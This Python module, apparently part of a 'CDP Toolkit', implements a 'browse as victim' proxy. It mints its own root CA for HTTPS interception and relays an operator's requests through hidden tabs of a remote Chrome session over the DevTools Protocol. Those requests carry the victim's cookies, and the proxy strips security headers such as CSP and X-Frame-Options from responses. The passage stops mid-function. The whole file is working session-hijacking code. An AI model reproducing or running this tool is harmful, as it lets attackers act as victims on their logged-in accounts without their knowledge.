from __future__ import annotations

import asyncio
import base64
import contextlib
import datetime
import ipaddress
import json
import ssl
import time
from dataclasses import dataclass
from http import HTTPStatus
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit, urlunsplit

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

from .client import CDPClient, TargetSession
from .log import info, warn
from .transport import CDPError


HOP_BY_HOP_HEADERS = {
    "connection",
    "keep-alive",
    "proxy-authenticate",
    "proxy-authorization",
    "proxy-connection",
    "te",
    "trailer",
    "transfer-encoding",
    "upgrade",
}

REQUEST_HEADER_DENYLIST = HOP_BY_HOP_HEADERS | {
    "content-length",
    "cookie",
    "host",
    "proxy-connection",
    "user-agent",
    "accept-encoding",
}

RESPONSE_HEADER_STRIP = HOP_BY_HOP_HEADERS | {
    "content-encoding",
    "content-length",
    "content-security-policy",
    "content-security-policy-report-only",
    "cross-origin-embedder-policy",
    "cross-origin-opener-policy",
    "cross-origin-resource-policy",
    "x-frame-options",
}

REDIRECT_STATUS_CODES = {301, 302, 303, 307, 308}
NO_BODY_STATUS_CODES = {204, 205, 304}
UTC = datetime.timezone.utc
FETCH_REQUEST_PATTERNS = {"patterns": [{"urlPattern": "*", "requestStage": "Request"}]}
SUBRESOURCE_FETCH_DESTS = {
    "audio",
    "audioworklet",
    "embed",
    "empty",
    "font",
    "image",
    "manifest",
    "object",
    "paintworklet",
    "report",
    "script",
    "serviceworker",
    "sharedworker",
    "style",
    "track",
    "video",
    "worker",
    "xslt",
}
DOCUMENT_FETCH_DESTS = {"document", "frame", "iframe"}
SUBRESOURCE_EXTENSIONS = {
    ".avif",
    ".bmp",
    ".css",
    ".gif",
    ".ico",
    ".jpeg",
    ".jpg",
    ".js",
    ".json",
    ".map",
    ".mjs",
    ".mp3",
    ".mp4",
    ".otf",
    ".png",
    ".svg",
    ".ttf",
    ".wasm",
    ".webm",
    ".webp",
    ".woff",
    ".woff2",
}
DOWNLOAD_PRONE_EXTENSIONS = {
    ".7z",
    ".bat",
    ".bin",
    ".bz2",
    ".cmd",
    ".crx",
    ".deb",
    ".dll",
    ".dmg",
    ".exe",
    ".gz",
    ".iso",
    ".msi",
    ".pdf",
    ".pkg",
    ".ps1",
    ".rar",
    ".rpm",
    ".tar",
    ".vbs",
    ".xz",
    ".zip",
}
DOCUMENT_HTML_EXPRESSION = r"""(() => {
  const doctype = document.doctype
    ? `<!DOCTYPE ${document.doctype.name}${document.doctype.publicId ? ` PUBLIC "${document.doctype.publicId}"` : ""}${document.doctype.systemId ? ` "${document.doctype.systemId}"` : ""}>`
    : "";
  return `${doctype}\n${document.documentElement ? document.documentElement.outerHTML : ""}`;
})()"""


@dataclass(slots=True)
class HttpRequest:
    method: str
    target: str
    version: str
    headers: list[tuple[str, str]]
    body: bytes

    def header(self, name: str, default: str | None = None) -> str | None:
        name_l = name.lower()
        for header_name, value in reversed(self.headers):
            if header_name.lower() == name_l:
                return value
        return default

    def should_keep_alive(self) -> bool:
        connection = (self.header("Connection", "") or "").lower()
        if self.version == "HTTP/1.0":
            return connection == "keep-alive"
        return connection != "close"


@dataclass(slots=True)
class ProxiedResponse:
    status_code: int
    reason: str
    headers: list[tuple[str, str]]
    body: bytes


@dataclass(slots=True)
class BrowseAsVictimProxyOptions:
    cdp_endpoint: str
    listen_host: str
    listen_port: int
    socks: str | None = None
    cert_dir: Path = Path("runs/proxy/certs")
    pool_size: int = 3
    fetch_timeout: float = 20.0
    hidden: bool = True
    subresource_loader: bool = True
    deny_downloads: bool = True


def _default_port(scheme: str) -> int:
    return 443 if scheme == "https" else 80


def _split_authority(authority: str, fallback_port: int) -> tuple[str, int]:
    probe = urlsplit(f"//{authority}")
    host = probe.hostname
    port = probe.port
    if not host:
        raise ValueError(f"invalid authority: {authority!r}")
    return host, port or fallback_port


def _absolute_url(
    request: HttpRequest,
    default_scheme: str,
    connect_host: str | None,
    connect_port: int | None,
) -> str:
    if request.target.startswith("http://") or request.target.startswith("https://"):
        return request.target

    authority = request.header("Host") or connect_host
    if not authority:
        raise ValueError("request has no Host header and no CONNECT host")

    if connect_host and not request.header("Host"):
        host = connect_host
        port = connect_port or _default_port(default_scheme)
    else:
        host, port = _split_authority(authority, _default_port(default_scheme))

    port_suffix = "" if port == _default_port(default_scheme) else f":{port}"
    return f"{default_scheme}://{host}{port_suffix}{request.target}"


def _normalize_url_for_match(url: str) -> str:
    parsed = urlsplit(url)
    path = parsed.path or "/"
    return urlunsplit((parsed.scheme.lower(), parsed.netloc.lower(), path, parsed.query, ""))


def _matches_navigation_url(event_url: str, target_url: str) -> bool:
    event_normalized = _normalize_url_for_match(event_url)
    target_normalized = _normalize_url_for_match(target_url)
    if event_normalized == target_normalized:
        return True

    event = urlsplit(event_normalized)
    target = urlsplit(target_normalized)
    return (
        target.scheme == "http"
        and event.scheme == "https"
        and event.netloc == target.netloc
        and (event.path or "/") == (target.path or "/")
        and event.query == target.query
    )


def _path_extension(url: str) -> str:
    path = urlsplit(url).path.lower()
    name = path.rsplit("/", 1)[-1]
    if "." not in name:
        return ""
    return "." + name.rsplit(".", 1)[-1]


def _origin_url(url: str) -> str:
    parsed = urlsplit(url)
    return urlunsplit((parsed.scheme, parsed.netloc, "/", "", ""))


def _runtime_fetch_expression(payload: dict[str, Any]) -> str:
    payload_json = json.dumps(payload, separators=(",", ":"))
    return f"""(async () => {{
  const req = {payload_json};
  try {{
    const headers = new Headers(req.headers || {{}});
    const init = {{
      method: req.method,
      headers,
      credentials: "include",
      cache: "no-store",
      redirect: "follow"
    }};
    if (req.body && req.method !== "GET" && req.method !== "HEAD") {{
      const binary = atob(req.body);
      const bytes = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      init.body = bytes;
    }}
    const response = await fetch(req.url, init);
    const buffer = await response.arrayBuffer();
    const bytes = new Uint8Array(buffer);
    let binary = "";
    const chunkSize = 0x8000;
    for (let offset = 0; offset < bytes.length; offset += chunkSize) {{
      binary += String.fromCharCode(...bytes.subarray(offset, offset + chunkSize));
    }}
    return {{
      ok: true,
      status: response.status,
      statusText: response.statusText,
      url: response.url,
      headers: Array.from(response.headers.entries()),
      body: btoa(binary)
    }};
  }} catch (error) {{
    return {{
      ok: false,
      error: String(error && (error.stack || error.message) || error)
    }};
  }}
}})()"""


def _resource_extra_headers(operator_headers: list[tuple[str, str]]) -> dict[str, str]:
    headers: dict[str, str] = {}
    for name, value in operator_headers:
        name_l = name.lower()
        if name_l in REQUEST_HEADER_DENYLIST or name_l.startswith(":"):
            continue
        headers[name] = value
    return headers


def _should_use_subresource_loader(request: HttpRequest, absolute_url: str) -> bool:
    if request.method not in {"GET", "HEAD"} or request.body:
        return False

    extension = _path_extension(absolute_url)
    if extension in DOWNLOAD_PRONE_EXTENSIONS:
        return True

    fetch_dest = (request.header("Sec-Fetch-Dest", "") or "").lower()
    if fetch_dest in DOCUMENT_FETCH_DESTS:
        return False
    if fetch_dest in SUBRESOURCE_FETCH_DESTS:
        return True

    accept = (request.header("Accept", "") or "").lower()
    if "text/html" in accept or "application/xhtml+xml" in accept:
        return False

    if extension in SUBRESOURCE_EXTENSIONS:
        return True

    return False


def _reason_phrase(status_code: int) -> str:
    try:
        return HTTPStatus(status_code).phrase
    except ValueError:
        return "OK" if 200 <= status_code < 300 else ""


def _drop_header(headers: dict[str, str], name: str) -> None:
    name_l = name.lower()
    for key in list(headers.keys()):
        if key.lower() == name_l:
            headers.pop(key, None)


def _dict_to_entries(headers: dict[str, str]) -> list[dict[str, str]]:
    return [{"name": str(name), "value": str(value)} for name, value in headers.items()]


def _tuple_to_entries(headers: list[tuple[str, str]]) -> list[dict[str, str]]:
    return [{"name": str(name), "value": str(value)} for name, value in headers]


def _merge_request_headers(
    operator_headers: list[tuple[str, str]],
    intercepted_headers: dict[str, Any],
) -> dict[str, str]:
    merged = {str(name): str(value) for name, value in intercepted_headers.items()}
    for name, value in operator_headers:
        name_l = name.lower()
        if name_l in REQUEST_HEADER_DENYLIST or name_l.startswith(":"):
            continue
        _drop_header(merged, name)
        merged[name] = value
    _drop_header(merged, "Content-Length")
    _drop_header(merged, "Accept-Encoding")
    merged["Accept-Encoding"] = "identity"
    return merged


def _normalize_response_headers(headers: list[dict[str, Any]]) -> list[tuple[str, str]]:
    normalized: list[tuple[str, str]] = []
    for entry in headers:
        name = str(entry.get("name") or "")
        value = str(entry.get("value") or "")
        if not name:
            continue
        if name.lower() in RESPONSE_HEADER_STRIP:
            continue
        normalized.append((name, value))
    return normalized


def _normalize_response_header_map(headers: dict[str, Any]) -> list[tuple[str, str]]:
    normalized: list[tuple[str, str]] = []
    for name, value in headers.items():
        name_s = str(name)
        if not name_s or name_s.lower() in RESPONSE_HEADER_STRIP:
            continue
        normalized.append((name_s, str(value)))
    return normalized


def _body_from_cdp(result: dict[str, Any]) -> bytes:
    body = result.get("body", "")
    if result.get("base64Encoded"):
        return base64.b64decode(body)
    return str(body).encode("utf-8")


def _resource_content_from_cdp(result: dict[str, Any]) -> bytes:
    content = result.get("content", "")
    if result.get("base64Encoded"):
        return base64.b64decode(content)
    return str(content).encode("utf-8")


def _format_exception(exc: BaseException) -> str:
    message = str(exc) or repr(exc)
    return f"{type(exc).__name__}: {message}"


def _is_expected_client_disconnect(exc: BaseException) -> bool:
    if isinstance(exc, (asyncio.IncompleteReadError, BrokenPipeError, ConnectionResetError, ssl.SSLError)):
        return True
    message = str(exc).lower()
    return (
        "ssl connection is closed" in message
        or "connection lost" in message
        or "connection reset" in message
    )


class CertAuthority:
    def __init__(self, cert_dir: Path) -> None:
        self.cert_dir = cert_dir
        self.issued_dir = cert_dir / "issued"
        self.ca_key_path = cert_dir / "ca.key"
        self.ca_cert_path = cert_dir / "ca.crt"
        self._ca_key: rsa.RSAPrivateKey | None = None
        self._ca_cert: x509.Certificate | None = None
        self._contexts: dict[str, ssl.SSLContext] = {}

    def ensure_ca(self) -> None:
        self.cert_dir.mkdir(parents=True, exist_ok=True)
        self.issued_dir.mkdir(parents=True, exist_ok=True)
        if self.ca_key_path.exists() and self.ca_cert_path.exists():
            self._ca_key = serialization.load_pem_private_key(self.ca_key_path.read_bytes(), password=None)
            self._ca_cert = x509.load_pem_x509_certificate(self.ca_cert_path.read_bytes())
            info("loaded proxy CA from {}", self.cert_dir)
            return

        info("generating proxy CA in {}", self.cert_dir)
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name(
            [
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "CDP Toolkit"),
                x509.NameAttribute(NameOID.COMMON_NAME, "CDP Toolkit Proxy Root CA"),
            ]
        )
        now = datetime.datetime.now(UTC)
        cert = (
            x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=3650))
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
            .add_extension(
                x509.KeyUsage(
                    digital_signature=True,
                    key_cert_sign=True,
                    crl_sign=True,
                    content_commitment=False,
                    key_encipherment=False,
                    data_encipherment=False,
                    key_agreement=False,
                    encipher_only=False,
                    decipher_only=False,
                ),
                critical=True,
            )
            .sign(key, hashes.SHA256())
        )
        self.ca_key_path.write_bytes(
            key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption(),
            )
        )
        self.ca_cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
        self._ca_key = key
        self._ca_cert = cert

    def ssl_context_for_host(self, hostname: str) -> ssl.SSLContext:
        if hostname in self._contexts:
            return self._contexts[hostname]
        cert_path, key_path = self._issue_leaf(hostname)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=str(cert_path), keyfile=str(key_path))
        self._contexts[hostname] = context
        return context

    def _issue_leaf(self, hostname: str) -> tuple[Path, Path]:
        if self._ca_key is None or self._ca_cert is None:
            raise RuntimeError("CA is not loaded")
        safe_host = "".join(ch if ch.isalnum() or ch in ".-_" else "_" for ch in hostname)
        cert_path = self.issued_dir / f"{safe_host}.pem"
        key_path = self.issued_dir / f"{safe_host}.key.pem"
        if cert_path.exists() and key_path.exists():
            return cert_path, key_path

        leaf_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = x509.Name(
            [
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "CDP Toolkit"),
                x509.NameAttribute(NameOID.COMMON_NAME, hostname),
            ]
        )
        try:
            san: x509.GeneralName = x509.IPAddress(ipaddress.ip_address(hostname))
        except ValueError:
            san = x509.DNSName(hostname)

        now = datetime.datetime.now(UTC)
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(self._ca_cert.subject)
            .public_key(leaf_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=30))
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(x509.SubjectAlternativeName([san]), critical=False)
            .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
            .sign(self._ca_key, hashes.SHA256())
        )
        key_path.write_bytes(
            leaf_key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption(),
            )
        )
        cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
        info("issued proxy leaf certificate for {}", hostname)
        return cert_path, key_path


class HiddenTab:
    def __init__(
        self,
        cdp: CDPClient,
        name: str,
        fetch_timeout: float,
        hidden: bool,
        subresource_loader: bool,
        deny_downloads: bool,
    ) -> None:
        self.cdp = cdp
        self.name = name
        self.fetch_timeout = fetch_timeout
        self.hidden = hidden
        self.subresource_loader = subresource_loader
        self.deny_downloads = deny_downloads
        self.target_id: str | None = None
        self.session: TargetSession | None = None
        self.events: asyncio.Queue | None = None
        self.lock = asyncio.Lock()

    async def start(self) -> None:
        params: dict[str, Any] = {"url": "about:blank", "background": True}
        if self.hidden:
            params["hidden"] = True
        try:
            result = await self.cdp.send("Target.createTarget", params)
        except CDPError as exc:
            if not self.hidden:
                raise
            warn("hidden target failed for {}: {}; falling back to background target", self.name, exc)
            result = await self.cdp.send("Target.createTarget", {"url": "about:blank", "background": True})

        self.target_id = result["targetId"]
        self.session = await self.cdp.attach(self.target_id)
        self.events = self.cdp.connection.subscribe_events(session_id=self.session.session_id, maxsize=5000)
        await self.session.send("Page.enable")
        if self.deny_downloads:
            try:
                await self.session.send("Page.setDownloadBehavior", {"behavior": "deny"})
                info("proxy tab {} download behavior set to deny", self.name)
            except Exception as exc:
                warn("proxy tab {} could not set download deny behavior: {}", self.name, _format_exception(exc))
        await self.session.send("Network.enable")
        with contextlib.suppress(Exception):
            await self.session.send("Network.setBypassServiceWorker", {"bypass": True})
        with contextlib.suppress(Exception):
            await self.session.send("Network.setCacheDisabled", {"cacheDisabled": True})
        await self._enable_fetch()
        info("proxy tab {} ready target={}", self.name, self.target_id)

    async def close(self) -> None:
        if self.events is not None:
            self.cdp.connection.unsubscribe_events(self.events)
            self.events = None
        if self.session is not None:
            with contextlib.suppress(Exception):
                await self.cdp.detach(self.session)
            self.session = None
        if self.target_id:
            with contextlib.suppress(Exception):
                await self.cdp.close_target(self.target_id)
            self.target_id = None

    async def fetch(self, request: HttpRequest, absolute_url: str) -> ProxiedResponse:
        async with self.lock:
            if self.session is None or self.events is None:
                raise RuntimeError(f"proxy tab {self.name} is not ready")
            self._drain_events()
            info("proxy {} -> {} {}", self.name, request.method, absolute_url)

            if self.subresource_loader and _should_use_subresource_loader(request, absolute_url):
                try:
                    return await self._load_subresource(request, absolute_url)
                except CDPError as exc:
                    if "wasn't found" not in str(exc) and "not found" not in str(exc).lower():
                        raise
                    warn("Network.loadNetworkResource unavailable; falling back to navigation fetch")

            await self.cdp.send_no_wait("Page.navigate", {"url": absolute_url}, session_id=self.session.session_id)

            request_pause = await self._wait_for_request_pause(absolute_url)
            request_params = request_pause["params"]
            request_id = request_params["requestId"]
            network_id = request_params.get("networkId")
            upstream_url = request_params.get("request", {}).get("url") or absolute_url
            if _normalize_url_for_match(upstream_url) != _normalize_url_for_match(absolute_url):
                info("proxy {} upstream navigation {} -> {}", self.name, absolute_url, upstream_url)
            intercepted_headers = request_params["request"].get("headers", {})
            merged_headers = _merge_request_headers(request.headers, intercepted_headers)

            continue_params: dict[str, Any] = {
                "requestId": request_id,
                "method": request.method,
                "headers": _dict_to_entries(merged_headers),
            }
            if urlsplit(upstream_url).scheme == "https":
                continue_params["interceptResponse"] = True
            else:
                info("proxy {} using Network response fallback for plaintext HTTP", self.name)
            if request.body:
                continue_params["postData"] = base64.b64encode(request.body).decode("ascii")
            await self.session.send("Fetch.continueRequest", continue_params)

            try:
                response_pause = await self._wait_for_response_pause(request_id, network_id)
            except RuntimeError as exc:
                if request.method in {"GET", "HEAD"} and "ERR_ABORTED" in str(exc):
                    warn(
                        "navigation fetch aborted for {}; trying Runtime.fetch fallback",
                        absolute_url,
                    )
                    return await self._runtime_fetch(request, absolute_url)
                raise
            if isinstance(response_pause, ProxiedResponse):
                info(
                    "proxy {} <- {} {} bytes={} via Network fallback",
                    self.name,
                    response_pause.status_code,
                    response_pause.reason,
                    len(response_pause.body),
                )
                return response_pause

            params = response_pause["params"]
            status_code = int(params.get("responseStatusCode") or 502)
            reason = str(params.get("responseStatusText") or _reason_phrase(status_code))
            headers = _normalize_response_headers(params.get("responseHeaders", []))

            body = b""
            if (
                request.method != "HEAD"
                and status_code not in REDIRECT_STATUS_CODES
                and status_code not in NO_BODY_STATUS_CODES
            ):
                try:
                    body_result = await self.session.send("Fetch.getResponseBody", {"requestId": request_id})
                    body = _body_from_cdp(body_result)
                except Exception as exc:
                    warn("Fetch.getResponseBody failed for {}: {}", absolute_url, _format_exception(exc))

            fulfill_params: dict[str, Any] = {
                "requestId": request_id,
                "responseCode": status_code,
                "responseHeaders": _tuple_to_entries(headers),
            }
            if reason:
                fulfill_params["responsePhrase"] = reason
            if body:
                fulfill_params["body"] = base64.b64encode(body).decode("ascii")
            with contextlib.suppress(Exception):
                await self.session.send("Fetch.fulfillRequest", fulfill_params)

            info("proxy {} <- {} {} bytes={}", self.name, status_code, reason, len(body))
            return ProxiedResponse(status_code=status_code, reason=reason, headers=headers, body=body)

    async def _load_subresource(self, request: HttpRequest, absolute_url: str) -> ProxiedResponse:
        assert self.session is not None
        info("proxy {} using Network.loadNetworkResource for {}", self.name, absolute_url)
        frame_tree = await self.session.send("Page.getFrameTree")
        frame_id = frame_tree.get("frameTree", {}).get("frame", {}).get("id")
        if not frame_id:
            raise RuntimeError("CDP did not return a frame id for Network.loadNetworkResource")

        extra_headers = _resource_extra_headers(request.headers)
        if extra_headers:
            await self.session.send("Network.setExtraHTTPHeaders", {"headers": extra_headers})
        try:
            result = await self._session_send(
                "Network.loadNetworkResource",
                {
                    "frameId": frame_id,
                    "url": absolute_url,
                    "options": {"disableCache": True, "includeCredentials": True},
                },
                timeout=self.fetch_timeout,
            )
        finally:
            if extra_headers:
                with contextlib.suppress(Exception):
                    await self.session.send("Network.setExtraHTTPHeaders", {"headers": {}})

        resource = result.get("resource", {})
        status_code = int(resource.get("httpStatusCode") or (200 if resource.get("success") else 502))
        reason = _reason_phrase(status_code)
        headers = _normalize_response_header_map(resource.get("headers", {}) or {})
        body = b""
        stream = resource.get("stream")
        if stream:
            if request.method != "HEAD" and status_code not in REDIRECT_STATUS_CODES and status_code not in NO_BODY_STATUS_CODES:
                body = await self._read_io_stream(stream)
            else:
                with contextlib.suppress(Exception):
                    await self._session_send("IO.close", {"handle": stream}, timeout=5)

        if not resource.get("success") and not resource.get("httpStatusCode"):
            error_name = resource.get("netErrorName") or "unknown network failure"
            raise RuntimeError(f"Network.loadNetworkResource failed for {absolute_url}: {error_name}")

        info("proxy {} <- {} {} bytes={} via Network.loadNetworkResource", self.name, status_code, reason, len(body))
        return ProxiedResponse(status_code=status_code, reason=reason, headers=headers, body=body)

    async def _runtime_fetch(self, request: HttpRequest, absolute_url: str) -> ProxiedResponse:
        assert self.session is not None
        if request.method not in {"GET", "HEAD"}:
            raise RuntimeError(f"Runtime.fetch fallback does not support {request.method}")

        origin = _origin_url(absolute_url)
        payload = {
            "url": absolute_url,
            "method": request.method,
            "headers": _resource_extra_headers(request.headers),
            "body": base64.b64encode(request.body).decode("ascii") if request.body else None,
        }

        try:
            with contextlib.suppress(Exception):
                await self._disable_fetch()
            self._drain_events()
            info("proxy {} preparing same-origin runtime fetch at {}", self.name, origin)
            await self.cdp.send_no_wait("Page.navigate", {"url": origin}, session_id=self.session.session_id)
            await self._wait_for_page_event()

            result = await self._session_send(
                "Runtime.evaluate",
                {
                    "expression": _runtime_fetch_expression(payload),
                    "returnByValue": True,
                    "awaitPromise": True,
                },
                timeout=self.fetch_timeout,
            )
            value = result.get("result", {}).get("value")
            if not isinstance(value, dict):
                raise RuntimeError(f"Runtime.fetch returned unexpected result: {result!r}")
            if not value.get("ok"):
                raise RuntimeError(f"Runtime.fetch failed for {absolute_url}: {value.get('error')}")

            body = base64.b64decode(value.get("body") or "")
            status_code = int(value.get("status") or 502)
            reason = str(value.get("statusText") or _reason_phrase(status_code))
            headers = _normalize_response_headers(
                [{"name": name, "value": header_value} for name, header_value in value.get("headers", [])]
            )
            info("proxy {} <- {} {} bytes={} via Runtime.fetch", self.name, status_code, reason, len(body))
            return ProxiedResponse(status_code=status_code, reason=reason, headers=headers, body=body)
        finally:
            with contextlib.suppress(Exception):
                await self._enable_fetch()

    async def _read_io_stream(self, handle: str) -> bytes:
        chunks: list[bytes] = []
        try:
            while True:
                chunk = await self._session_send("IO.read", {"handle": handle}, timeout=self.fetch_timeout)
                data = chunk.get("data", "")
                if data:
                    if chunk.get("base64Encoded"):
                        chunks.append(base64.b64decode(data))
                    else:
                        chunks.append(str(data).encode("utf-8"))
                if chunk.get("eof"):
                    break
        finally:
            with contextlib.suppress(Exception):
                await self._session_send("IO.close", {"handle": handle}, timeout=5)
        return b"".join(chunks)

    def _drain_events(self) -> None:
        assert self.events is not None
        drained = 0
        while True:
            try:
                self.events.get_nowait()
                drained += 1
            except asyncio.QueueEmpty:
                if drained:
                    info("proxy tab {} drained {} stale events", self.name, drained)
                return

    async def _enable_fetch(self) -> None:
        assert self.session is not None
        await self.session.send("Fetch.enable", FETCH_REQUEST_PATTERNS)

    async def _disable_fetch(self) -> None:
        assert self.session is not None
        await self.session.send("Fetch.disable")

    async def _session_send(self, method: str, params: dict[str, Any], *, timeout: float | None = None) -> dict[str, Any]:
        assert self.session is not None
        return await self.cdp.connection.send(method, params, session_id=self.session.session_id, timeout=timeout)

    async def _next_event(self, deadline: float) -> dict[str, Any]:
        assert self.events is not None
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError(f"proxy tab {self.name} timed out waiting for CDP event")
        try:
            return await asyncio.wait_for(self.events.get(), timeout=remaining)
        except asyncio.TimeoutError as exc:
            raise TimeoutError(f"proxy tab {self.name} timed out waiting for CDP event") from exc

    async def _wait_for_page_event(self) -> None:
        deadline = time.monotonic() + min(self.fetch_timeout, 5.0)
        while True:
            try:
                event = await self._next_event(deadline)
            except TimeoutError:
                return
            if event.get("method") in {"Page.domContentEventFired", "Page.loadEventFired"}:
                return

    async def _wait_for_request_pause(self, absolute_url: str) -> dict[str, Any]:
        assert self.session is not None
        deadline = time.monotonic() + self.fetch_timeout
        target_url = _normalize_url_for_match(absolute_url)
        while True:
            event = await self._next_event(deadline)
            if event.get("method") != "Fetch.requestPaused":
                continue
            params = event.get("params", {})
            if params.get("responseStatusCode") is not None:
                continue
            event_url = params.get("request", {}).get("url", "")
            if _matches_navigation_url(event_url, target_url):
                return event
            with contextlib.suppress(Exception):
                await self.session.send("Fetch.continueRequest", {"requestId": params["requestId"]})

    async def _wait_for_response_pause(
        self,
        request_id: str,
        network_id: str | None,
    ) -> dict[str, Any] | ProxiedResponse:
        deadline = time.monotonic() + self.fetch_timeout
        network_response: ProxiedResponse | None = None
        network_frame_id: str | None = None
        network_url: str | None = None
        network_resource_type: str | None = None
        while True:
            event = await self._next_event(deadline)
            method = event.get("method")
            params = event.get("params", {})
            event_request_id = params.get("requestId")

            if method == "Network.responseReceived" and network_id and event_request_id == network_id:
                response = params.get("response", {})
                status_code = int(response.get("status") or 502)
                reason = str(response.get("statusText") or _reason_phrase(status_code))
                headers = _normalize_response_header_map(response.get("headers", {}))
                network_response = ProxiedResponse(status_code, reason, headers, b"")
                network_frame_id = params.get("frameId")
                network_url = response.get("url")
                network_resource_type = params.get("type")
                info("proxy {} observed Network.responseReceived {} {}", self.name, status_code, reason)
                continue

            if method == "Network.loadingFinished" and network_id and event_request_id == network_id:
                if network_response is None:
                    continue
                try:
                    await self._disable_fetch()
                except Exception as exc:
                    warn("Fetch.disable failed before Network body fallback: {}", _format_exception(exc))
                try:
                    body_result = await self._session_send(
                        "Network.getResponseBody",
                        {"requestId": network_id},
                        timeout=5,
                    )
                    network_response.body = _body_from_cdp(body_result)
                except Exception as exc:
                    warn("Network.getResponseBody failed for {}: {}", network_id, _format_exception(exc))
                    if network_frame_id and network_url:
                        try:
                            content_result = await self._session_send(
                                "Page.getResourceContent",
                                {"frameId": network_frame_id, "url": network_url},
                                timeout=5,
                            )
                            network_response.body = _resource_content_from_cdp(content_result)
                        except Exception as resource_exc:
                            warn(
                                "Page.getResourceContent failed for {}: {}",
                                network_url,
                                _format_exception(resource_exc),
                            )
                    if not network_response.body and network_resource_type == "Document":
                        try:
                            html_result = await self._session_send(
                                "Runtime.evaluate",
                                {
                                    "expression": DOCUMENT_HTML_EXPRESSION,
                                    "returnByValue": True,
                                    "awaitPromise": True,
                                },
                                timeout=5,
                            )
                            html = html_result.get("result", {}).get("value") or ""
                            network_response.body = str(html).encode("utf-8")
                        except Exception as dom_exc:
                            warn(
                                "Runtime document serialization failed for {}: {}",
                                network_url or network_id,
                                _format_exception(dom_exc),
                            )
                try:
                    await self._enable_fetch()
                except Exception as exc:
                    warn("Fetch.enable failed after Network body fallback: {}", _format_exception(exc))
                return network_response

            if method == "Network.loadingFailed" and network_id and params.get("requestId") == network_id:
                error_text = params.get("errorText") or "unknown network failure"
                canceled = " canceled" if params.get("canceled") else ""
                raise RuntimeError(f"CDP network request failed{canceled}: {error_text}")
            if method != "Fetch.requestPaused":
                continue
            if params.get("requestId") != request_id:
                continue
            if params.get("responseStatusCode") is None:
                continue
            return event


class HiddenTabPool:
    def __init__(
        self,
        cdp: CDPClient,
        size: int,
        fetch_timeout: float,
        hidden: bool,
        subresource_loader: bool,
        deny_downloads: bool,
    ) -> None:
        self.cdp = cdp
        self.size = size
        self.fetch_timeout = fetch_timeout
        self.hidden = hidden
        self.subresource_loader = subresource_loader
        self.deny_downloads = deny_downloads
        self.tabs: list[HiddenTab] = []

    async def start(self) -> None:
        for index in range(self.size):
            tab = HiddenTab(
                self.cdp,
                f"tab-{index + 1}",
                self.fetch_timeout,
                self.hidden,
                self.subresource_loader,
                self.deny_downloads,
            )
            await tab.start()
            self.tabs.append(tab)
        info("proxy tab pool ready with {} tabs", len(self.tabs))

    async def close(self) -> None:
        for tab in self.tabs:
            await tab.close()
        self.tabs.clear()

    async def fetch(self, request: HttpRequest, absolute_url: str) -> ProxiedResponse:
        if not self.tabs:
            raise RuntimeError("proxy tab pool is not initialized")
        for tab in self.tabs:
            if not tab.lock.locked():
                return await tab.fetch(request, absolute_url)
        return await self.tabs[0].fetch(request, absolute_url)


async def _read_chunked_body(reader: asyncio.StreamReader) -> bytes:
    chunks: list[bytes] = []
    while True:
        line = await reader.readline()
        if not line:
            raise ValueError("unexpected EOF reading chunked request body")
        chunk_size = int(line.strip().split(b";", 1)[0], 16)
        if chunk_size == 0:
            while True:
                trailer = await reader.readline()
                if trailer in {b"\r\n", b"\n", b""}:
                    break
            return b"".join(chunks)
        chunks.append(await reader.readexactly(chunk_size))
        await reader.readexactly(2)


async def _read_http_request(reader: asyncio.StreamReader) -> HttpRequest | None:
    try:
        head = await reader.readuntil(b"\r\n\r\n")
    except asyncio.IncompleteReadError:
        return None
    except asyncio.LimitOverrunError as exc:
        raise ValueError("request headers exceeded stream limit") from exc

    lines = head.decode("iso-8859-1").split("\r\n")
    request_line = lines[0]
    if not request_line:
        return None
    parts = request_line.split(" ", 2)
    if len(parts) != 3:
        raise ValueError(f"invalid HTTP request line: {request_line!r}")
    method, target, version = parts

    headers: list[tuple[str, str]] = []
    for line in lines[1:]:
        if not line or ":" not in line:
            continue
        name, _, value = line.partition(":")
        headers.append((name.strip(), value.lstrip()))

    header_map = {name.lower(): value for name, value in headers}
    body = b""
    if header_map.get("transfer-encoding", "").lower() == "chunked":
        body = await _read_chunked_body(reader)
    elif "content-length" in header_map:
        length = int(header_map.get("content-length") or "0")
        if length > 0:
            body = await reader.readexactly(length)

    return HttpRequest(method=method.upper(), target=target, version=version, headers=headers, body=body)


async def _write_http_response(
    writer: asyncio.StreamWriter,
    response: ProxiedResponse,
    *,
    keep_alive: bool,
) -> None:
    headers = [
        (name, value)
        for name, value in response.headers
        if name.lower() not in HOP_BY_HOP_HEADERS and name.lower() != "content-length"
    ]
    headers.append(("Content-Length", str(len(response.body))))
    headers.append(("Connection", "keep-alive" if keep_alive else "close"))

